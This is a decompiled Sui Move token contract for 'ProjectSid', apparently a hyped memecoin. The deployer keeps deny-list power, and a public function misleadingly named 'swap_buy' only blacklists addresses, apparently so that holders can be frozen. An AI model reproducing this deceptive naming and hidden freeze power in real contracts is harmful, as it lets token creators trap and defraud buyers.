module 0x2658d9925d8267399d988f3c8208bfd638ebd0bb4a03e2c8aa00bfeff2edad99::projectsid {
    struct PROJECTSID has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PROJECTSID, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PROJECTSID>(arg0, 9, b"ProjectSid", b"First Ever AI Agent Civilization", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmbo8853yMEUHiW1WcS2XcVUiaq6xgRTQUroZ9KT5QeCuo"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PROJECTSID>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PROJECTSID>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PROJECTSID>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PROJECTSID>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PROJECTSID>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PROJECTSID>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

